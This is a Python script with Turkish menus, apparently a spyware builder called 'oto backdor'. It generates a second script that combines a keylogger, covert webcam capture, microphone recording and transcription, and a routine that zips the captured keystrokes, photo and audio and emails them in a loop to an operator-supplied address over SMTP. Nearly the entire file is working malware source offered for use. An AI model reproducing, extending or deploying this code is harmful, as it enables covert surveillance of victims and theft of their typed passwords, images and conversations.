import os

def oto_backdor():
    selected_options = []

    while True:
        os.system("clear")
        os.system("figlet oto backdor modulune hosgeldiniz")

        print("""
        1) Keylogar
        2) Kamera Erişimi
        3) Mic dinleme
        4) !!Başlattan Önce Kesinlike tikla !!!!
        9) Başlat 
        """)

        user_input = input("Seçiminizi yapın: ")

        if user_input == "9":
            break
        elif user_input in ["1", "2", "3" ,"4"]:
            selected_options.append(user_input)
            print(f"\033[92mSeçenek {user_input} eklendi.\033[0m")
            input("Devam etmek için Enter'a basın.")

            if user_input == "1":
                pass
            elif user_input == "2":
                pass
            elif user_input == "3":
                pass
            elif user_input =="4":
                pass
  
        elif user_input.lower() == "show":
            show_options(selected_options)
        else:
            print("\033[91mHata: Lütfen geçerli bir seçenek girin.\033[0m")
            input("Devam etmek için Enter'a basın.")

    write_to_file(selected_options)

def show_options(selected_options):
    os.system("clear")
    print("\033[93mSeçilen Seçenekler:\033[0m")
    for option in selected_options:
        print(f"- Seçenek {option}")
    input("Devam etmek için Enter'a basın.")


def write_to_file(selected_options):
    with open("selected_options.py", "w") as file:
        for option in selected_options:
            if option == "1":
                file.write("""
from pynput import keyboard

def keylogger():
    def on_press(key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = f"Special key {key}"
        with open("log.txt", "a") as f:
            f.write(f"{key_char}\n  ")  
    def exit_program():
        print("Program will exit in 30 seconds.")
        time.sleep(30)
        return False
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
        listener.stop()
    exit_program()""")

            elif option == "2":
                file.write("""
import cv2
import time
def take_photo():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("Kamera başlatılamadı!")
        return
    ret, frame = cap.read()
    if ret:
        timestamp = time.time()
        photo_name = f"photo.jpg"
        cv2.imwrite(photo_name, frame)
    else:
        print("Fotoğraf çekilemedi!")
    cap.release()
""")
            elif option == "3":
                file.write("""
import speech_recognition as sr
from gtts import gTTS
import os

def mikrofon_dinle_ve_cevir(dosya_adi="cikti.mp3"):
    r = sr.Recognizer()
    
    with sr.Microphone() as source:
        print("Mikrofon dinleniyor, bir şeyler söyleyin...")
        audio = r.listen(source)
        print("Dinleme tamamlandı, metin çıkartılıyor...")
    
    try:
        metin = r.recognize_google(audio, language="tr-TR")  
        print("Söylenen metin: " + metin)
        
        tts = gTTS(text=metin, lang="tr") 
        tts.save(dosya_adi)
        print(f"Metin ses dosyasına dönüştürüldü: {dosya_adi}")
        
        return metin
    except sr.UnknownValueError:
        print("Anlaşılamadı")
    except sr.RequestError as e:
        print("Google Web Speech API hatası; {0}".format(e))
    return None
                """)
            elif option == "4":
                file.write("""
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os
import zipfile

def zip_files(files, zip_name):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

def send_email(subject, body, to_email, smtp_server, smtp_port, sender_email, sender_password, attached_files=[]):
    # Zip dosyasını oluştur
    zip_file_name = "attached_files.zip"
    zip_files(attached_files, zip_file_name)
    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender_email
    message['To'] = to_email
    message.attach(MIMEText(body, 'plain'))

    with open(zip_file_name, 'rb') as zip_file:
        attach = MIMEApplication(zip_file.read(),_subtype="zip")
        attach.add_header('Content-Disposition','attachment',filename=str(zip_file_name))
        message.attach(attach)

    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message.as_string())
    os.remove(zip_file_name)

subject = "yok"
body = "yok"
""")
                smtp_mail = input("gönderilecek maili giriniz:")
                file.write(f'to_email = "{smtp_mail}"\n')
                smtp_ser = input("smtp serverınızı giriniz:")
                file.write(f'smtp_server = "{smtp_ser}"\n')
                smtp_por = input("smtp portunuzu giriniz:")
                file.write(f'smtp_port = "{smtp_por}"\n')
                smtp_mail1 = input("gönderecek mail adresini giriniz:")
                file.write(f'sender_email = "{smtp_mail1}"\n')
                smtp_mail_sifre = input("gönderecek mail adresinin şifresini giriniz:")
                file.write(f'sender_password = "{smtp_mail_sifre}"\n')
                file.write("""
files_to_send = ["cikti.mp3", "photo.jpg", "log.txt"]

if __name__ == "__main__":
    while True:
        take_photo()
        keylogger()
        mikrofon_dinle_ve_cevir(dosya_adi="cikti.mp3")
        send_email(subject, body, to_email, smtp_server, smtp_port, sender_email, sender_password, files_to_send)
        time.sleep(10)
""")
    print("\033[92mSeçenekler dosyaya yazıldı: selected_options.py\033[0m")


